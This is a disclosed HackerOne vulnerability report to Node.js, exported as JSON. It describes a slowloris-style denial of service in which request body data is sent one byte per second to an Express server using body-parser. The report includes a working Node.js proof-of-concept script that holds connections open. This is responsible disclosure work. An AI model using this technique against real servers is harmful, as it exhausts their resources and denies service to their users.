{
  "id": 799072,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTkwNzI=",
  "url": "https://hackerone.com/reports/799072",
  "title": "Slowloris, body parsing",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2020-02-18T21:52:59.796Z",
  "submitted_at": "2020-02-18T21:52:59.796Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "underflow0",
    "url": "/underflow0",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-10-17T19:25:57.436Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-09-17T19:25:51.095Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** [add summary of the vulnerability]\nAttackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open by maintaining activity, and use resources over an extended period.\n\n**Description:** [add more details about this vulnerability]\nBody data is sent one byte at a time, slowly, in a HTTP request. The connection stays open, hogging resources. There is no builtin feature that can make this trigger a timeout, as long as the bytes are sent at an interval lower than the `server.timeout` value if it is set. May not technically be a Node.js bug since it doesn't handle parsing of the body, but the typically body parsing library (e.g. https://www.npmjs.com/package/body-parser) does not implement any feature to mitigate the vulnerability.\n\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n  1. Start a HTTP server and set the server timeout to 2 seconds.\n  2. Add a library that parses the request body.\n  2. Open a connection to the server.\n  3. Send a HTTP header.\n  4. Send the body, 1 byte per second.\n\n## Impact: [add why this issue matters]\nSee summary.\n\n## Supporting Material/References:\n\nCode to reproduce\n```\nconst bodyParser = require('body-parser');\nconst express = require('express');\nconst net = require('net');\nconst http = require('http');\n\nasync function run() {\n    const expressApp = express();\n\n    expressApp.use(bodyParser.json());\n\n    expressApp.use(async (req, res) => {\n        res.send({body: req.body});\n    });\n\n    const server = http.createServer(expressApp);\n\n    setInterval(() => {\n        console.log(server.connections);\n    },  1000);\n\n    server.keepAliveTimeout = 2000;\n    server.timeout = 2000;\n\n    await new Promise(resolve => {\n        server.listen(3000, '127.0.0.1', () => {\n            resolve();\n        });\n    });\n\n    const client = new net.Socket();\n\n    const length = 5000;\n\n    const msg = `GET / HTTP/1.1\nHost: localhost:3000\nAccept: */*\nContent-Type: application/json\nContent-Length: ${length}\n\n[\"`;\n\n    client.connect(3000, '127.0.0.1', async function () {\n        client.write(msg);\n\n        for (let i = 0; i < length - 4; i++) {\n            await new Promise(resolve => {\n                setTimeout(resolve, 1000);\n            });\n\n            client.write('' + (i % 10));\n        }\n\n        client.write('\"]');\n    });\n}\n\nrun();\n```\n\n## Impact\n\nAttackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open and use resources over an extended period.",
  "bounty_amount": "250.0",
  "formatted_bounty": "$250",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-10-17T19:25:51.202Z",
  "allow_singular_disclosure_after": -104868737.25996536,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "0xelkomy",
    "cryptographer",
    "xfiltrer",
    "whyamihacking",
    "3m3m",
    "muemmelmoehre",
    "ekgaribadmi",
    "deadshot_aka_daredevil"
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
